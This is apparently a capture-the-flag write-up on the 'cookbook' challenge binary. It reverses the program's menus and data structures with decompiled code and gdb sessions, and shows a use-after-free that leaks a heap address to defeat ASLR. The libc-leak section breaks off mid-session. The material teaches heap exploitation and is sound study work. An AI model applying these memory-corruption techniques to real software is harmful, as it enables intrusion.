# Cookbook

This writeup is based off of this writeup with multiple parts. It is seriously one of the best writeups I have ever seen:
```
This exploit is based off of this writeup with multiple parts (one of the best writeups I ever saw):
https://www.youtube.com/watch?v=f1wp6wza8ZI
https://www.youtube.com/watch?v=dnHuZLySS6g
https://www.youtube.com/watch?v=PISoSH8KGVI
link to exploit: https://gist.github.com/LiveOverflow/dadc75ec76a4638ab9ea#file-cookbook-py-L20
```

When we extract the tar archive, we see that we have an x86 elf and a libc file. Let's see what the elf does:

```
$	file cookbook 
cookbook: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2397d3d3c3b98131022ddd98f30e702bd4b88230, stripped
$	file libc.so.6 
libc.so.6: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=25dd428fb4c350c16dfee20491f1a06484a2bfa3, for GNU/Linux 2.6.32, stripped
$	what's your name?
guyinatuxedo
+-----------------------------+
|          .--,--.            |
|          `.  ,.'            |
|           |___|             |
|           :o o:             |
|          _`~^~'             |
|        /'   ^   `\          |
| cooking manager pro v6.1... |
+-----------------------------+
====================
[l]ist ingredients
[r]ecipe book
[a]dd ingredient
[c]reate recipe
[e]xterminate ingredient
[d]elete recipe
[g]ive your cookbook a name!
[R]emove cookbook name
[q]uit
l
------
name: water
calories: 0
price: 6
------
name: tomato
calories: 1
price: 5
------
name: basil
calories: 2
price: 4
------
name: garlic
calories: 3
price: 3
------
name: onion
calories: 4
price: 2
------
name: lemon
calories: 5
price: 1
------
name: corn
calories: 6
price: 10
------
name: olive oil
calories: 2
price: 3
------
====================
[l]ist ingredients
[r]ecipe book
[a]dd ingredient
[c]reate recipe
[e]xterminate ingredient
[d]elete recipe
[g]ive your cookbook a name!
[R]emove cookbook name
[q]uit
c
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
a
can't do it on a null guy
which ingredient to add? water
how many? (hex): 0x50
Segmentation fault (core dumped)
```

So we can see that this essentially allows you to perform functions such as creating recipes, adding ingredients, viewing ingredients, and so on. Let's take a look at the binary in IDA to see exactly what each thing does.

## Reversing

Starting off in the main function, we can see it calls several functions. One of those functions that we can see, appears to be the menu that we are prompted with:

```
int menu()
{
  char *s2; // ST1C_4@10
  char menu_option; // [sp+A2h] [bp-16h]@2
  int v3; // [sp+ACh] [bp-Ch]@1

  v3 = *MK_FP(__GS__, 20);
  while ( 1 )
  {
    puts("====================");
    puts("[l]ist ingredients");
    puts("[r]ecipe book");
    puts("[a]dd ingredient");
    puts("[c]reate recipe");
    puts("[e]xterminate ingredient");
    puts("[d]elete recipe");
    puts("[g]ive your cookbook a name!");
    puts("[R]emove cookbook name");
    puts("[q]uit");
    fgets(&menu_option, 10, stdin);
    switch ( menu_option )
    {
      case 'l':
        list_ingredients();
        break;
      case 'r':
        recipe_book();
        break;
      case 'a':
        add_ingredient();
        break;
      case 'c':
        create_recipe();
        break;
      case 'g':
        name_cookbook();
        break;
      case 'R':
        remove_cookbook();
        break;
      case 'q':
        puts("goodbye, thanks for cooking with us!");
        return *MK_FP(__GS__, 20) ^ v3;
      case 'e':
        s2 = (char *)calloc(0x80u, 1u);
        printf("which ingredient to exterminate? ");
        fgets(s2, 128, stdin);
        s2[strcspn(s2, "\n")] = 0;
        sub_80497F9(s2);
        free(s2);
        break;
      default:
        puts("UNKNOWN DIRECTIVE");
        break;
    }
  }
}
```

Let's look through each of the options starting with `l`:

```
int list_ingredients()
{
  int result; // eax@1
  int v1; // [sp+8h] [bp-10h]@1

  result = ingredients;
  v1 = ingredients;
  while ( v1 )
  {
    puts("------");
    print_ingredient_properties(*(_DWORD *)v1);
    result = *(_DWORD *)(v1 + 4);
    v1 = *(_DWORD *)(v1 + 4);
    if ( !v1 )
      result = puts("------");
  }
  return result;
}
```

Here we can see that the option for `l` prints out the ingredients. It does this by taking the pointer stored in the global variable `ingredients` at `0x0804D094` in the bss, iterating through all of the pointers in the linked list, and passing them to `print_ingredien_properties` which we can see does this.

```
int __cdecl print_ingredient_properties(int a1)
{
  printf("name: %s\n", a1 + 8);                 // here we can see that the name is stored at an offset 0x8
  printf("calories: %zd\n", *(_DWORD *)a1);     // here we can see that the calories is stored as an int at offset 0x0
  return printf("price: %zd\n", *(_DWORD *)(a1 + 4));// here we can see that the price is stored as an in a offset 0x4
}
``` 

So here we can see the actual structure of an ingredient. The first four bytes is an int which stores the calories. The second four bytes is an int which stores the price. After that is a char array which stores the name.

All of this can be confirmed with gdb:

```
gdb-peda$ b *0x804a28f
Breakpoint 1 at 0x804a28f
gdb-peda$ r
Starting program: /Hackery/bkp16/cookbook/cookbook 
what's your name?
guyinatuxedo
+-----------------------------+
|          .--,--.            |
|          `.  ,.'            |
|           |___|             |
|           :o o:             |
|          _`~^~'             |
|        /'   ^   `\          |
| cooking manager pro v6.1... |
+-----------------------------+
====================
[l]ist ingredients
[r]ecipe book
[a]dd ingredient
[c]reate recipe
[e]xterminate ingredient
[d]elete recipe
[g]ive your cookbook a name!
[R]emove cookbook name
[q]uit
l
------

[----------------------------------registers-----------------------------------]
EAX: 0x804e050 --> 0x0 
EBX: 0xffffd100 --> 0x1 
ECX: 0xfbad0087 
EDX: 0xf7faf870 --> 0x0 
ESI: 0x1 
EDI: 0xf7fae000 --> 0x1b5db0 
EBP: 0xffffd018 --> 0xffffd0d8 --> 0xffffd0e8 --> 0x0 
ESP: 0xffffcff0 --> 0x804e050 --> 0x0 
EIP: 0x804a28f (call   0x804a214)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a286:	mov    DWORD PTR [ebp-0xc],eax
   0x804a289:	sub    esp,0xc
   0x804a28c:	push   DWORD PTR [ebp-0xc]
=> 0x804a28f:	call   0x804a214
   0x804a294:	add    esp,0x10
   0x804a297:	mov    eax,DWORD PTR [ebp-0x10]
   0x804a29a:	mov    eax,DWORD PTR [eax+0x4]
   0x804a29d:	mov    DWORD PTR [ebp-0x10],eax
Guessed arguments:
arg[0]: 0x804e050 --> 0x0 
[------------------------------------stack-------------------------------------]
0000| 0xffffcff0 --> 0x804e050 --> 0x0 
0004| 0xffffcff4 --> 0x82 
0008| 0xffffcff8 --> 0xf7e567fb (<fgets+11>:	add    edi,0x157805)
0012| 0xffffcffc --> 0xffffd100 --> 0x1 
0016| 0xffffd000 --> 0x1 
0020| 0xffffd004 --> 0xf7fae000 --> 0x1b5db0 
0024| 0xffffd008 --> 0x804e510 --> 0x804e050 --> 0x0 
0028| 0xffffd00c --> 0x804e050 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804a28f in ?? ()
gdb-peda$ x/wx 0x804d094
0x804d094:	0x0804e510
gdb-peda$ x/2wx 0x0804e510 
0x804e510:	0x0804e050	0x0804e520
gdb-peda$ x/3wx 0x0804e050 
0x804e050:	0x00000000	0x00000006	0x65746177
gdb-peda$ x/s 0x0804e058
0x804e058:	"water"
```

Next we have the `r` option:

```
unsigned int recipe_book()
{
  int current_recipe_ptr; // ST1C_4@2
  unsigned int result; // eax@3
  unsigned int i; // [sp+4h] [bp-14h]@1
  unsigned int recipe_count; // [sp+8h] [bp-10h]@1

  recipe_count = count_items(&recipe_collection);// count the number of recipes in the cookbook
  printf("%s's cookbook", name_storage);        // print the name of the cookbook
  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i >= recipe_count )
      break;
    current_recipe_ptr = grab_recipe_count(&recipe_collection, i);// grab a pointer for the current recipe, and run it through print_recipe
    print_recipe(current_recipe_ptr);
  }
  return result;
}
```

So we can see that it runs through all of the recipes in the cookbook, and passes them to the function `print_recipe`. From here we can tell that the recipes are stored as pointers, which is pointed to by the global var `recipe_collection` which is stored in the bss at the address `0x804d08c`.

and when we look at the `print_recipe` function

```
int __cdecl print_recipe(int pointer_argument)
{
  int total_cost; // eax@4
  int total_cals; // eax@4
  int ingredient_pointer; // [sp+14h] [bp-24h]@1
  int ingredient_quantity; // [sp+18h] [bp-20h]@1
  unsigned int i; // [sp+1Ch] [bp-1Ch]@1
  unsigned int ingredient_count; // [sp+20h] [bp-18h]@1
  int current_count; // [sp+24h] [bp-14h]@2
  int current_ingredient; // [sp+28h] [bp-10h]@2
  int v10; // [sp+2Ch] [bp-Ch]@1

  v10 = *MK_FP(__GS__, 20);
  ingredient_pointer = *(_DWORD *)pointer_argument;
  ingredient_quantity = *(_DWORD *)(pointer_argument + 4);
  ingredient_count = count_items(&ingredient_pointer);
  printf("[---%s---]\n", pointer_argument + 8); // recipe_name at offset: 0x8
  printf("recipe type: %s\n", *(_DWORD *)(pointer_argument + 124));// Recipe type at offset: 124
  puts((const char *)(pointer_argument + 140)); // recipe instructions at 140
  for ( i = 0; i < ingredient_count; ++i )
  {
    current_count = grab_recipe_count(&ingredient_quantity, i);
    current_ingredient = grab_recipe_count(&ingredient_pointer, i);// This will return a pointer to the current ingredient struct
    printf("%zd - %s\n", current_count, current_ingredient + 8);// Remeber the ingredients named is stored at an offset of +8. The price is stored at an offset of +0, and the calories is stored at an offset of +4.
  }
  total_cost = fetch_total_cost(pointer_argument);// This will add together all of the prices of the ingredients.
  printf("total cost : $%zu\n", total_cost);
  total_cals = fetch_total_cals(pointer_argument);// This will add together all of the calories of the ingredients.
  printf("total cals : %zu\n", total_cals);
  return *MK_FP(__GS__, 20) ^ v10;
}
```

So from here, we can tell what the structure of a recipe is in the heap:

```
0:	pointer to linked list of ingredients
4:	pointer to array of ingredient counts
8:	char array for recipe name
124: char pointer to recipe type
140: char array for recipe instruction
```

Let's look at the `g` option:

```
int name_cookbook()
{
  unsigned __int32 size; // ST18_4@1
  char size_input; // [sp+Ch] [bp-4Ch]@1
  int v3; // [sp+4Ch] [bp-Ch]@1

  v3 = *MK_FP(__GS__, 20);
  printf("how long is the name of your cookbook? (hex because you're both a chef and a hacker!) : ");
  fgets(&size_input, 64, stdin);                // prompt user for size of name
  size = strtoul(&size_input, 0, 16);           // convert to int
  ptr = (char *)malloc(size);                   // malloc amount of space equal to int
  fgets(ptr, size, stdin);                      // scan in the int amount of data into that space
  printf("the new name of the cookbook is %s\n", ptr);// ptr is a global var to bss 0x804d0a8
  return *MK_FP(__GS__, 20) ^ v3;
}
```

So looking at this, we can see that the name of of the cookbook is just a char pointer stored in `ptr`

```
gdb-peda$ x/wx 0x804d0a8
0x804d0a8:	0x0804f2b0
gdb-peda$ x/s 0x804f2b0
0x804f2b0:	"15935728\n"
```

It prompts is for the size of our name, then it mallocs that much then scans in that much data into it. Checking the xreferences to `ptr` we can see that it is only used in two other places which are free calls in the `R` option, and when the program ends.

```
void remove_cookbook()
{
  free(ptr);                                    // ptr is to bss 0x0804D0A8
}
```

So we can see `remove_cookbook()` just frees the pointer `ptr` which is stored as a global variable. Note it doesn't check to see if is an actual pointer, so we could free it twice and cause a crash.

the `e` option allocates 0x80 bytes worth of space in the heap, scans in that much data into the space, then frees it:

```
      case 'e':
        freed_ptr = (char *)calloc(0x80u, 1u);
        printf("which ingredient to exterminate? ");
        fgets(freed_ptr, 128, stdin);
        freed_ptr[strcspn(freed_ptr, "\n")] = 0;
        sub_80497F9(freed_ptr);                 // does not change anything about freed_ptr
        free(freed_ptr);                        // no_checking_done
        break;
``` 

The `a` option presents us with another menu:
```
int add_ingredient()
{
  char *name_write; // [sp+8h] [bp-30h]@9
  char *price_write; // [sp+Ch] [bp-2Ch]@13
  char *calories_write; // [sp+14h] [bp-24h]@17
  char v4[10]; // [sp+22h] [bp-16h]@2
  int v5; // [sp+2Ch] [bp-Ch]@1

  v5 = *MK_FP(__GS__, 20);
  while ( 1 )
  {
    puts("====================");
    puts("[l]ist current stats?");
    puts("[n]ew ingredient?");
    puts("[c]ontinue editing ingredient?");
    puts("[d]iscard current ingredient?");
    puts("[g]ive name to ingredient?");
    puts("[p]rice ingredient?");
    puts("[s]et calories?");
    puts("[q]uit (doesn't save)?");
    puts("[e]xport saving changes (doesn't quit)?");
    fgets(v4, 10, stdin);
    v4[strcspn(v4, "\n")] = 0;
    switch ( v4[0] )
    {
      case 'l':
        if ( cur_ing )
          print_ingredient_properties((int)cur_ing);
        else
          puts("can't print NULL!");
        break;
      case 'n':
        cur_ing = malloc(0x90u);
        *((_DWORD *)cur_ing + 35) = cur_ing;
        break;
      case 'c':
        puts("still editing this guy");
        break;
      case 'd':
        free(cur_ing);
        cur_ing = 0;
        break;
      case 'g':
        name_write = (char *)calloc(0x80u, 1u);
        if ( cur_ing )
        {
          fgets(name_write, 128, stdin);
          name_write[strcspn(name_write, "\n")] = 0;
          memcpy((char *)cur_ing + 8, name_write, 0x80u);
        }
        else
        {
          puts("can't do it on a null guy");
        }
        free(name_write);
        break;
      case 'p':
        price_write = (char *)calloc(0x80u, 1u);
        if ( cur_ing )
        {
          fgets(price_write, 0x80, stdin);
          price_write[strcspn(price_write, "\n")] = 0;
          *((_DWORD *)cur_ing + 1) = atoi(price_write);
        }
        else
        {
          puts("can't do it on a null guy");
        }
        free(price_write);
        break;
      case 's':
        calories_write = (char *)calloc(0x80u, 1u);
        if ( cur_ing )
        {
          fgets(calories_write, 0x80, stdin);
          calories_write[strcspn(calories_write, "\n")] = 0;
          *(_DWORD *)cur_ing = atoi(calories_write);
        }
        else
        {
          puts("can't do it on a null guy");
        }
        free(calories_write);
        break;
      case 'e':
        if ( cur_ing )
        {
          if ( sub_8049C58((char *)cur_ing + 8) == 0xFFFFFFFF && *((_BYTE *)cur_ing + 8) )
          {
            append_ingredient(&ingredients, (int)cur_ing);
            cur_ing = 0;
            puts("saved!");
          }
          else
          {
            puts("can't save because this is bad.");
          }
        }
        else
        {
          puts("can't do it on a null guy");
        }
        break;
      default:
        puts("UNKNOWN DIRECTIVE");
        break;
      case 'q':
        return *MK_FP(__GS__, 20) ^ v5;
    }
  }
}
```

After reversing all of this, we have what each of these secondary menu options do:

```
cur_ing = current ingredient being edited, global variable stored in bss at 0x804d09c
l - prints ingredient options
n - mallocs 0x90 bytes of space, sets cur_ing equal to the pointer returned by malloc, then sets that address + 0x8c equal to the pointer returned by malloc
c - prints out a string
d - frees cur_ing, sets cur_ing equal to zero 
g - callos 0x80 bytes of space, if cur_ing is set it will scan 128 bytes into the calloced space, removes the trailing newline then write that as the cur_ing name
p - callos 0x80 bytes of space, if cur_ing is set it will scan 128 bytes into the calloced space, removes the trailing newline and converts it to an integer, then write the output of that as cur_ing price
s - callos 0x80 bytes of space, if cur_ing is set it will scan 128 bytes into the calloced space, removes the trailing newline and converts it to an integer, then write the output of that as cur_ing calories
q - exits the function 
e - if cur_ing is set, it will append the pointer cur_ing to the end of the linked list ingredients
```

the `c` option also presents us with another menu:
```
int create_recipe()
{
  int hex_int; // ST2C_4@9
  unsigned int i; // [sp+Ch] [bp-CCh]@12
  int cur_rec_ing; // [sp+10h] [bp-C8h]@12
  int ingredient_ptr; // [sp+18h] [bp-C0h]@7
  int v5; // [sp+20h] [bp-B8h]@13
  char s[10]; // [sp+32h] [bp-A6h]@2
  char hex_input[144]; // [sp+3Ch] [bp-9Ch]@7
  int v8; // [sp+CCh] [bp-Ch]@1

  v8 = *MK_FP(__GS__, 20);
  while ( 1 )
  {
LABEL_2:
    puts("[n]ew recipe");
    puts("[d]iscard recipe");
    puts("[a]dd ingredient");
    puts("[r]emove ingredient");
    puts("[g]ive recipe a name");
    puts("[i]nclude instructions");
    puts("[s]ave recipe");
    puts("[p]rint current recipe");
    puts("[q]uit");
    fgets(s, 10, stdin);
    s[strcspn(s, "\n")] = 0;
    switch ( s[0] )
    {
      case 'n':
        cur_rec = calloc(1u, 0x40Cu);
        continue;
      case 'd':
        free(cur_rec);
        continue;
      case 'a':
        if ( !cur_rec )
          puts("can't do it on a null guy");
        printf("which ingredient to add? ");
        fgets(hex_input, 0x90, stdin);
        hex_input[strcspn(hex_input, "\n")] = 0;
        ingredient_ptr = grap_ingredient_ptr(hex_input);
        if ( ingredient_ptr )
        {
          printf("how many? (hex): ");
          fgets(hex_input, 0x90, stdin);
          hex_input[strcspn(hex_input, "\n")] = 0;
          hex_int = strtoul(hex_input, 0, 16);
          append_ingredient(cur_rec, ingredient_ptr);
          append_ingredient((_DWORD *)cur_rec + 1, hex_int);
          puts("nice");
        }
        else
        {
          printf("I dont know about, %s!, please add it to the ingredient list!\n", hex_input);
        }
        continue;
      case 'r':
        if ( !cur_rec )
        {
          puts("can't do it on a null guy");
          continue;
        }
        printf("which ingredient to remove? ");
        fgets(hex_input, 0x90, stdin);
        i = 0;
        cur_rec_ing = *(_DWORD *)cur_rec;
        break;
      case 'g':
        if ( cur_rec )
          fgets((char *)cur_rec + 140, 0x40C, stdin);
        else
          puts("can't do it on a null guy");
        continue;
      case 'i':
        if ( cur_rec )
        {
          fgets((char *)cur_rec + 140, 0x40C, stdin);
          s[strcspn(s, "\n")] = 0;
        }
        else
        {
          puts("can't do it on a null guy");
        }
        continue;
      case 's':
        if ( cur_rec )
        {
          if ( sub_8049CB8((char *)cur_rec + 8) == -1 && *((_BYTE *)cur_rec + 8) )
          {
            *((_DWORD *)cur_rec + 31) = off_804D064;
            append_ingredient(&recipe_collection, (int)cur_rec);
            cur_rec = 0;
            puts("saved!");
          }
          else
          {
            puts("can't save because this is bad.");
          }
        }
        else
        {
          puts("can't do it on a null guy");
        }
        continue;
      case 'p':
        if ( cur_rec )
          print_recipe((int)cur_rec);
        continue;
      default:
        puts("UNKNOWN DIRECTIVE");
        continue;
      case 'q':
        return *MK_FP(__GS__, 20) ^ v8;
    }
    while ( cur_rec_ing )
    {
      v5 = *(_DWORD *)cur_rec_ing;
      if ( !strcmp((const char *)(*(_DWORD *)cur_rec_ing + 8), hex_input) )
      {
        sub_80487B5((int *)cur_rec, i);
        sub_80487B5((int *)cur_rec + 1, i);
        printf("deleted %s from the recipe!\n", v5 + 8);
        goto LABEL_2;
      }
      ++i;
      cur_rec_ing = *(_DWORD *)(cur_rec_ing + 4);
    }
  }
}
```

after reversing it, we find out that the menu options do this:

```
cur_rec = current recipe being edited, stored as a global variable in the bss at 0x804d0a0
n - callocs 0x40c bytes worth of space, set's cur_rec equal to the pointer returned by calloc
d - frees cur_rec
a - checks if cur_rec is zero, and if it is prints an error message (function does continue), scans  0x90 bytes worth of data in hex_input, checks to see if that corresponds to any ingredient name and if so returns a ptr to it, if a ptr is returned then it will scan in 0x90 bytes which is converted to an unsigned long integer from hex string. Proceeding that the ingredient name is added to cur_rec, with the quanitity from the output fo the hex string conversion.
r - Scans in 0x90 bytes worth of data into hex_input, sets cur_rec_ing to a pointer for cur_rec's ingredients and i equal to zero. Since cur_rec_ing is set, the while loop at the end will run.  The loop will iterate through all of the ingredients untill it finds one with a name that matchees your input, however since the trailing newline isn't removed from your input (but it is removed from the ingredient name) this will pose a proble. After that it supposedly removes the ingredient. 
g - if cur_rec is set, it will scan in 0x40c bytes into the instructions for cur_rec (not the name)
i - if cur_rec is set, it will scan in 0x40c bytes into the instructions for cur_rec
s - First checks to see if cur_rec is set, then performs a secondary check to see if the name has been set (we don't have a method of directly setting it, so this presents a problem). After that it adds cur_rec to recipe_collection, then sets cur_rec equal to zero.
p - if cur_rec is set, it will print the current setting for cur_rec by running it through print_recipe
q - exits the function
```



The `q` option just exits the menu. We can also see that the option `d` doesn't actually have a case for it set, so it will just print out `UNKOWN DIRECTIVE` (as well any other input thta has not been mentioned).

## Finding Infoleaks

#### Heap Leak

First off we have a use after free bug in the `create_recipe` menu (option `c`). We see that in there, if we delete an item (option `d`) it frees the space but the pointer remains:

```
      case 'd':
        free(cur_rec);
        continue;
```

Let's see how what this space looks like in gdb after it is freed:

```
gdb-peda$ b *0x80495a0
Breakpoint 1 at 0x80495a0
gdb-peda$ r
Starting program: /Hackery/bkp16/cookbook/cookbook 
what's your name?
guyinatuxedo
+-----------------------------+
|          .--,--.            |
|          `.  ,.'            |
|           |___|             |
|           :o o:             |
|          _`~^~'             |
|        /'   ^   `\          |
| cooking manager pro v6.1... |
+-----------------------------+
====================
[l]ist ingredients
[r]ecipe book
[a]dd ingredient
[c]reate recipe
[e]xterminate ingredient
[d]elete recipe
[g]ive your cookbook a name!
[R]emove cookbook name
[q]uit
c
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
n
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
a
which ingredient to add? water
how many? (hex): 0x1
nice
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
p

[----------------------------------registers-----------------------------------]
EAX: 0x804f2b0 --> 0x804f6c0 --> 0x804e050 --> 0x0 
EBX: 0xffffd130 --> 0x1 
ECX: 0x1 
EDX: 0xffffcfa2 --> 0xd9000070 
ESI: 0x1 
EDI: 0xf7fae000 --> 0x1b5db0 
EBP: 0xffffd048 --> 0xffffd108 --> 0xffffd118 --> 0x0 
ESP: 0xffffcf60 --> 0x804f2b0 --> 0x804f6c0 --> 0x804e050 --> 0x0 
EIP: 0x80495a0 (call   0x80495d6)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8049597:	mov    eax,ds:0x804d0a0
   0x804959c:	sub    esp,0xc
   0x804959f:	push   eax
=> 0x80495a0:	call   0x80495d6
   0x80495a5:	add    esp,0x10
   0x80495a8:	jmp    0x80495bc
   0x80495aa:	sub    esp,0xc
   0x80495ad:	push   0x804a5ec
Guessed arguments:
arg[0]: 0x804f2b0 --> 0x804f6c0 --> 0x804e050 --> 0x0 
[------------------------------------stack-------------------------------------]
0000| 0xffffcf60 --> 0x804f2b0 --> 0x804f6c0 --> 0x804e050 --> 0x0 
0004| 0xffffcf64 --> 0x804a5ea --> 0x4e55000a ('\n')
0008| 0xffffcf68 --> 0xf7fae5a0 --> 0xfbad208b 
0012| 0xffffcf6c --> 0xf7e6447c (<__uflow+12>:	add    ebx,0x149b84)
0016| 0xffffcf70 --> 0xf7e64747 (<_IO_default_uflow+7>:	add    eax,0x1498b9)
0020| 0xffffcf74 --> 0xf7fae5e8 --> 0xf7faf87c --> 0x0 
0024| 0xffffcf78 --> 0x0 
0028| 0xffffcf7c --> 0xf7e57991 (<_IO_getline_info+161>:	add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080495a0 in ?? ()
gdb-peda$ x/3wx 0x804f2b0
0x804f2b0:	0x0804f6c0	0x0804f6d0	0x00000000
gdb-peda$ x/4wx 0x804f6c0
0x804f6c0:	0x0804e050	0x00000000	0x00000000	0x00000011
gdb-peda$ x/3wx 0x804e050
0x804e050:	0x00000000	0x00000006	0x65746177
```

So here we can see is the memory of our recipe (starting at `0x804f2b0`). We can see the pointers to the linked list for the ingredients (stored at `0x804f6c0`), and the array to the ingredient counts. And we can also see our one ingredient which is stored at `0x804e050`.  Let's see what the memory for the `cur_rec` looks like after it is freed.

```
gdb-peda$ c
Continuing.
[------]
recipe type: (null)

1 - water
total cost : $6
total cals : 0
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
d
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
p

[----------------------------------registers-----------------------------------]
EAX: 0x804f2b0 --> 0xf7fae7b0 --> 0x804f6d8 --> 0x0 
EBX: 0xffffd130 --> 0x1 
ECX: 0x1 
EDX: 0xffffcfa2 --> 0xd9000070 
ESI: 0x1 
EDI: 0xf7fae000 --> 0x1b5db0 
EBP: 0xffffd048 --> 0xffffd108 --> 0xffffd118 --> 0x0 
ESP: 0xffffcf60 --> 0x804f2b0 --> 0xf7fae7b0 --> 0x804f6d8 --> 0x0 
EIP: 0x80495a0 (call   0x80495d6)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8049597:	mov    eax,ds:0x804d0a0
   0x804959c:	sub    esp,0xc
   0x804959f:	push   eax
=> 0x80495a0:	call   0x80495d6
   0x80495a5:	add    esp,0x10
   0x80495a8:	jmp    0x80495bc
   0x80495aa:	sub    esp,0xc
   0x80495ad:	push   0x804a5ec
Guessed arguments:
arg[0]: 0x804f2b0 --> 0xf7fae7b0 --> 0x804f6d8 --> 0x0 
[------------------------------------stack-------------------------------------]
0000| 0xffffcf60 --> 0x804f2b0 --> 0xf7fae7b0 --> 0x804f6d8 --> 0x0 
0004| 0xffffcf64 --> 0x804a5ea --> 0x4e55000a ('\n')
0008| 0xffffcf68 --> 0xf7fae5a0 --> 0xfbad208b 
0012| 0xffffcf6c --> 0xf7e6447c (<__uflow+12>:	add    ebx,0x149b84)
0016| 0xffffcf70 --> 0xf7e64747 (<_IO_default_uflow+7>:	add    eax,0x1498b9)
0020| 0xffffcf74 --> 0xf7fae5e8 --> 0xf7faf87c --> 0x0 
0024| 0xffffcf78 --> 0x0 
0028| 0xffffcf7c --> 0xf7e57991 (<_IO_getline_info+161>:	add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080495a0 in ?? ()
gdb-peda$ x/3wx 0x804f2b0
0x804f2b0:	0xf7fae7b0	0xf7fae7b0	0x00000000
gdb-peda$ x/wx 0xf7fae7b0
0xf7fae7b0:	0x0804f6d8
gdb-peda$ c
Continuing.
[------]
recipe type: (null)

134543064 - 
total cost : $331063448
total cals : 0
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
```

So we can see that the data has been replaced with heap metada, which is a pointer to the area of the heap where it can start allocating more data `0x804f6d8` exactly 1064 bytes after `0x804f2b0`.  Because of it's positioning, it is where it expects the ingredients to be it ends up printing out the value being pointed to `0x804f6d8` in base ten (134543064). With this we have a heap address which we can use to bypass ASLR in the heap.

#### Libc Leak

Next up, let's see what happens when we allocate space to a recipe, free it, then make a new ingredient. Let's see exactly how the data is layed out when this happens.

```
gdb-peda$ r
Starting program: /Hackery/bkp16/cookbook/cookbook 
what's your name?
guyinatuxedo
+-----------------------------+
|          .--,--.            |
|          `.  ,.'            |
|           |___|             |
|           :o o:             |
|          _`~^~'             |
|        /'   ^   `\          |
| cooking manager pro v6.1... |
+-----------------------------+
====================
[l]ist ingredients
[r]ecipe book
[a]dd ingredient
[c]reate recipe
[e]xterminate ingredient
[d]elete recipe
[g]ive your cookbook a name!
[R]emove cookbook name
[q]uit
c
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
n
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
a
which ingredient to add? water
how many? (hex): 0x1
nice
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
i
15935728
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
^C
Program received signal SIGINT, Interrupt.

[----------------------------------registers-----------------------------------]
EAX: 0xfffffe00 
EBX: 0x0 
ECX: 0xf7fae5e7 --> 0xfaf87c0a 
EDX: 0x1 
ESI: 0xf7fae5a0 --> 0xfbad208b 
EDI: 0xf7fac960 --> 0x0 
EBP: 0xffffce78 --> 0x9 ('\t')
ESP: 0xffffce28 --> 0xffffce78 --> 0x9 ('\t')
EIP: 0xf7fd7c89 (<__kernel_vsyscall+9>:	pop    ebp)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7fd7c83 <__kernel_vsyscall+3>:	mov    ebp,esp
   0xf7fd7c85 <__kernel_vsyscall+5>:	sysenter 
   0xf7fd7c87 <__kernel_vsyscall+7>:	int    0x80
=> 0xf7fd7c89 <__kernel_vsyscall+9>:	pop    ebp
   0xf7fd7c8a <__kernel_vsyscall+10>:	pop    edx
   0xf7fd7c8b <__kernel_vsyscall+11>:	pop    ecx
   0xf7fd7c8c <__kernel_vsyscall+12>:	ret    
   0xf7fd7c8d:	nop
[------------------------------------stack-------------------------------------]
0000| 0xffffce28 --> 0xffffce78 --> 0x9 ('\t')
0004| 0xffffce2c --> 0x1 
0008| 0xffffce30 --> 0xf7fae5e7 --> 0xfaf87c0a 
0012| 0xffffce34 --> 0xf7ed03e3 (<read+35>:	pop    ebx)
0016| 0xffffce38 --> 0xf7fac300 --> 0x0 
0020| 0xffffce3c --> 0xf7e6362f (<_IO_file_underflow+303>:	add    esp,0x10)
0024| 0xffffce40 --> 0x0 
0028| 0xffffce44 --> 0xf7fae5e7 --> 0xfaf87c0a 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGINT
0xf7fd7c89 in __kernel_vsyscall ()
gdb-peda$ x/wx 0x804d0a0
